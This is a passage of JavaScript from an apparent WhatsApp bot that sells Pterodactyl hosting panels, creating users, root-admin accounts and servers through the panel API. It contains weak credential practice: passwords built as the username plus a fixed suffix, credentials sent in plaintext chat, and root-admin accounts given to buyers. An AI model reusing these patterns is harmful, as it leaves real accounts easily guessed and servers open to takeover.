 businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `ziyoo æ`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`Please choose the size you want to buy`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/m9g0wk.jpg" } }, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msghhhhhhhh.key.remoteJid, msghhhhhhhh.message, {
 messageId: msghhhhhhhh.key.id
})*/
await m.reply(p)
ptz.sendMessage(u, { text: `*HERE ARE THE DETAILS OF YOUR PANEL ACCOUNT*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
case "admin": case "createadmin": {
if (!isCreator) return reply(`*This feature is specifically for Owner Gw!*`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await ptz.sendMessage(m.chat, listMessage)

    await ptz.sendMessage(nomornya, {

        text: `*HERE ARE THE DETAILS OF YOUR PANEL ACCOUNT*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER ONLY SENDS YOUR ACCOUNT DATA 1X PLEASE SAVE IT CAREFULLY IF YOUR ACCOUNT DATA IS LOST OWNER CANNOT SEND YOUR ACCOUNT AGAIN*
• ONLY 1X GUARANTEE
• WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE
• DO NOT DESTROY OTHER SERVERS
• CREATE ENOUGH PANELS


`,

    })

} 
break
case "listadmin": {
  if (!isPremium) return reply(`Sorry, you can't see the user list.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await ptz.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
		 if (!isPremium) return reply(`NGAPAIN ANJG`)
          if (!text) return reply(`Example : ${prefix + command} .spanel +62 831-2344-8708,pass,link.xyz,user`)
          // reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m22 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
  var m99 = mon.split(",")[3]
                    let mq1 = m.quoted ? m.quoted.sender : m1 ? m1.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
                  let ownernya = global.owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]



m.reply("sukses")
setTimeout(() => {
ptz.sendMessage(mq1, {text:`*───❖》Teni Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Your Order Arrived 📦*\n*Date : ${hariini}*\n*Jam : ${time2}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : ${m99}*\n*[+] Password : ${m22}*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Don't forget to change your password to avoid panel account theft_*\n`})  
}, 1000)
}
            break             
case "webpanel":
if (!isPremium) return reply("Tak nak")
ewe = `nih kak ${domain}`
await ptz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isPremium) return reply('kusus Prem')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
        case "1gb": {
        if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your account panel -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss1 = ctf

let msghhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Veran', 
     thumbnailUrl: 'https://files.catbox.moe/m9g0wk.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss1
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "Veran",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhh.message, {
 messageId: msghhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctf})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "2gb": {
    if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "70"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your panel account  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss2 = ctff

let msghhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Veran', 
     thumbnailUrl: 'https://files.catbox.moe/m9g0wk.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss2
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhh.message, {
 messageId: msghhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctff})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "3gb": {
    if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "100"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctfff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your panel account -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss3 = ctfff

let msghhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Veran', 
     thumbnailUrl: 'https://files.catbox.moe/m9g0wk.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss3
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctfff})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}


let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break
case "4gb": {
        if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your panel account-*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss4 = ctffff

let msghhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Veran', 
     thumbnailUrl: 'https://files.catbox.moe/m9g0wk.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss4
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "Veran",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctffff})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "5gb": {
    if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "150"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctfffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your panel account-*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss5 = ctfffff

let msghhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Veran', 
     thumbnailUrl: 'https://files.catbox.moe/m9g0wk.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss5
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "Veran",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
